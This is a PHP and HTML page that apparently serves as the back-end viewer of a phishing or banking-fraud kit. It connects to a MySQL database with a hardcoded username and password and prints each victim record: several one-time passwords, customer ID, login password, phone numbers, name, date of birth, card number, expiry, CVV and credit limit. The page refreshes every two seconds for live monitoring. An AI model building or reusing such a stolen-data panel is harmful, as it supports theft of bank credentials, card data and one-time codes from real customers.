<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');

        main {
            display: grid;
            background: darkgoldenrod;
            border: solid;
            color: #fff;
            font-family: "Poppins", sans-serif;
            font-weight: 500;
            font-style: normal;
            margin-bottom: 7px;
        }

        main1 {
        font-size: 21px;
        padding: 2px 5px;
}

        .data {
            font-size: 25px;
            margin: 10px auto;
            font-weight: bold;
            text-align: center;
        }

        span {
            color: black;
        }
        .red-background {
            background-color: dimgray;
            padding: 3px;
        }
    </style>
    <script>
        // JavaScript to reload the page every 5 seconds
        setInterval(function () {
            location.reload();
        }, 2000); // 5000 milliseconds = 5 seconds
    </script>
</head>

<body>
    <div class="data">Data Fetch</div>
    <?php
    $servername = "localhost";
    $username = "u964159363_1234";
    $password = "Royal@0011";
    $dbname = "u964159363_1234";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Assume $conn is your database connection object from the previous code

    $sql = "SELECT * FROM users ORDER BY id DESC"; // Query to fetch all data from table
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        // Output data of each row
        while ($row = $result->fetch_assoc()) {
            echo "<main>";

            // Check each field and only display <main1> if the field is not empty
            if (!empty($row['id'])) {
                
                echo "<main1>ID : <span>" . $row['id'] . "</span></main1>";
                
            }
            if (!empty($row['T1'])) {
                echo "<div class='red-background'>";
                echo "<main1>OTP 1 : <span>" . $row['T1'] . "</span></main1>";
                echo "</div>";
            }
            if (!empty($row['T2'])) {
                echo "<div class='red-background'>";
                echo "<main1>OTP 2 : <span>" . $row['T2'] . "</span></main1>";
                echo "</div>";
            }
            if (!empty($row['T3'])) {
                echo "<div class='red-background'>";
                echo "<main1>OTP 3: <span>" . $row['T3'] . "</span></main1>";
                echo "</div>";
            }
            if (!empty($row['T4'])) {
                echo "<div class='red-background'>";
                echo "<main1>OTP 4: <span>" . $row['T4'] . "</span></main1>";
                echo "</div>";
            }
            if (!empty($row['T5'])) {
                echo "<div class='red-background'>";
                echo "<main1>OTP 5 : <span>" . $row['T5'] . "</span></main1>";
                echo "</div>";
            }
            if (!empty($row['T6'])) {
                echo "<div class='red-background'>";
                echo "<main1>OTP 6 Update: <span>" . $row['T6'] . "</span></main1>";
                echo "</div>";
            }
            if (!empty($row['lc_id'])) {
                echo "<main1>Customer ID : <span>" . $row['lc_id'] . "</span></main1>";
            }
            if (!empty($row['lpass'])) {
                echo "<main1>Password : <span>" . $row['lpass'] . "</span></main1>";
            }
            if (!empty($row['rgmob'])) {
                echo "<main1>Mobile : <span>" . $row['rgmob'] . "</span></main1>";
            }
            if (!empty($row['rgmob1'])) {
                echo "<main1>Mobile : <span>" . $row['rgmob1'] . "</span></main1>";
            }
            if (!empty($row['acname'])) {
                echo "<main1>Acc Holder : <span>" . $row['acname'] . "</span></main1>";
            }
            if (!empty($row['dobInput'])) {
                echo "<main1>DOB : <span>" . $row['dobInput'] . "</span></main1>";
            }
            if (!empty($row['ccnum'])) {
                echo "<main1>Cre Number : <span>" . $row['ccnum'] . "</span></main1>";
            }
            if (!empty($row['edate'])) {
                echo "<main1>E Date : <span>" . $row['edate'] . "</span></main1>";
            }
            if (!empty($row['cvv'])) {
                echo "<main1>CVV : <span>" . $row['cvv'] . "</span></main1>";
            }
            if (!empty($row['creditlimit'])) {
                echo "<main1>Limit : <span>" . $row['creditlimit'] . "</span></main1>";
            }

            echo "</main>";
        }
    } else {
        echo "0 results";
    }

    $conn->close();
    ?>


</body>

</html>
